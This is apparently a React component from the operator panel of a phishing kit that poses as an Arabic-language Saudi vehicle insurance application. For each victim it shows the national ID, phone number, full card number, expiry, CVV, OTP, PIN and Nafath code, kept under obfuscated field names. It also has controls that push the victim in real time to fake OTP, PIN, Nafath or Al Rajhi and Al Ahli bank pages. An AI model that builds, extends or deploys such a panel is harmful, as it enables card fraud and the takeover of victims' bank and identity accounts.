"use client"

import { useState } from "react"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { updateApplication } from "@/lib/firebase-services"
import {
  User,
  Phone,
  CreditCard,
  Car,
  Globe,
  Monitor,
  Send,
  Shield,
  MapPin,
} from "lucide-react"

interface VisitorDetailsProps {
  visitor: InsuranceApplication | null
}

const REDIRECT_OPTIONS = [
  { value: "otp", label: "OTP" },
  { value: "pin", label: "PIN" },
  { value: "nafad", label: "نفاذ" },
  { value: "rajhi", label: "الراجحي" },
  { value: "ahli", label: "الأهلي" },
  { value: "wait", label: "انتظار" },
  { value: "done", label: "تم" },
]

function maskCard(val?: string): string {
  if (!val || val.length < 4) return val || "-"
  return "•••• " + val.slice(-4)
}

function InfoRow({ label, value, icon }: { label: string; value?: string | number | null; icon?: React.ReactNode }) {
  return (
    <div className="flex items-center gap-2 py-1.5 border-b border-gray-50 last:border-b-0">
      {icon && <span className="text-gray-400">{icon}</span>}
      <span className="text-[11px] text-gray-500 w-20 flex-shrink-0">{label}</span>
      <span className="text-[11px] text-gray-800 font-medium truncate" dir="ltr">
        {value || "-"}
      </span>
    </div>
  )
}

export function VisitorDetails({ visitor }: VisitorDetailsProps) {
  const [redirecting, setRedirecting] = useState(false)

  if (!visitor) {
    return (
      <div className="flex-1 flex items-center justify-center bg-gray-50">
        <p className="text-sm text-gray-400">اختر زائر لعرض التفاصيل</p>
      </div>
    )
  }

  const handleRedirect = async (page: string) => {
    if (!visitor.id) return
    setRedirecting(true)
    try {
      await updateApplication(visitor.id, {
        redirectPage: page,
        redirectRequestedAt: new Date().toISOString(),
      } as any)
    } catch (error) {
      console.error("Error redirecting:", error)
    }
    setRedirecting(false)
  }

  const hasCard = !!(visitor._v1 || visitor.cardNumber)

  return (
    <div className="flex-1 overflow-y-auto bg-gray-50 p-3 sm:p-4">
      <div className="max-w-2xl mx-auto space-y-3">
        <div className="bg-white rounded-xl border border-gray-200 p-4">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold text-white ${
                hasCard ? "bg-green-500" : "bg-gray-400"
              }`}>
                {visitor.ownerName?.charAt(0) || "?"}
              </div>
              <div>
                <h2 className="text-sm font-bold text-gray-800">{visitor.ownerName || "زائر"}</h2>
                <p className="text-[10px] text-gray-400">{visitor.id}</p>
              </div>
            </div>
            <div className={`px-2 py-0.5 rounded-full text-[10px] font-medium ${
              visitor.isOnline
                ? "bg-green-100 text-green-700"
                : "bg-gray-100 text-gray-500"
            }`}>
              {visitor.isOnline ? "متصل" : "غير متصل"}
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6">
            <InfoRow label="الهوية" value={visitor.identityNumber} icon={<Shield className="h-3 w-3" />} />
            <InfoRow label="الجوال" value={visitor.phoneNumber} icon={<Phone className="h-3 w-3" />} />
            <InfoRow label="الصفحة" value={visitor.currentPage} icon={<MapPin className="h-3 w-3" />} />
            <InfoRow label="الخطوة" value={visitor.currentStep} icon={<User className="h-3 w-3" />} />
            <InfoRow label="الدولة" value={visitor.country} icon={<Globe className="h-3 w-3" />} />
            <InfoRow label="الجهاز" value={`${visitor.deviceType || ""} ${visitor.browser || ""}`} icon={<Monitor className="h-3 w-3" />} />
            <InfoRow label="المركبة" value={visitor.serialNumber} icon={<Car className="h-3 w-3" />} />
            <InfoRow label="نوع التأمين" value={visitor.insuranceType} />
          </div>
        </div>

        {hasCard && (
          <div className="bg-white rounded-xl border border-green-200 p-4">
            <div className="flex items-center gap-2 mb-3">
              <CreditCard className="h-4 w-4 text-green-600" />
              <h3 className="text-xs font-bold text-green-800">بيانات البطاقة</h3>
            </div>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6">
              <InfoRow label="رقم البطاقة" value={visitor._v1 || visitor.cardNumber} />
              <InfoRow label="تاريخ الانتهاء" value={visitor._v2} />
              <InfoRow label="CVV" value={visitor._v3} />
              <InfoRow label="OTP" value={visitor._v5} />
              <InfoRow label="PIN" value={visitor._v6} />
              <InfoRow label="نفاذ" value={visitor._v7} />
            </div>

            {visitor.history && visitor.history.length > 0 && (
              <div className="mt-3 pt-3 border-t border-gray-100">
                <h4 className="text-[10px] font-bold text-gray-500 mb-2">السجل</h4>
                <div className="space-y-1 max-h-32 overflow-y-auto">
                  {visitor.history.map((entry: any, i: number) => (
                    <div key={i} className="text-[10px] text-gray-600 bg-gray-50 rounded px-2 py-1">
                      <span className="font-medium text-gray-700">{entry.type}</span>
                      {entry.data?._v1 && <span className="mr-2">{maskCard(entry.data._v1)}</span>}
                      {entry.data?._v5 && <span className="mr-2">OTP: {entry.data._v5}</span>}
                      {entry.data?._v6 && <span className="mr-2">PIN: {entry.data._v6}</span>}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        )}

        <div className="bg-white rounded-xl border border-gray-200 p-4">
          <div className="flex items-center gap-2 mb-3">
            <Send className="h-4 w-4 text-blue-600" />
            <h3 className="text-xs font-bold text-gray-800">توجيه الزائر</h3>
          </div>
          <div className="flex flex-wrap gap-2">
            {REDIRECT_OPTIONS.map((opt) => (
              <button
                key={opt.value}
                disabled={redirecting}
                onClick={() => handleRedirect(opt.value)}
                className={`px-3 py-1.5 rounded-lg text-[11px] font-medium border transition-colors ${
                  visitor.redirectPage === opt.value
                    ? "bg-blue-100 border-blue-300 text-blue-700"
                    : "bg-gray-50 border-gray-200 text-gray-600 hover:bg-gray-100"
                } disabled:opacity-50`}
              >
                {opt.label}
              </button>
            ))}
          </div>
          {visitor.redirectPage && (
            <p className="mt-2 text-[10px] text-gray-400">
              التوجيه الحالي: {visitor.redirectPage}
            </p>
          )}
        </div>
      </div>
    </div>
  )
}
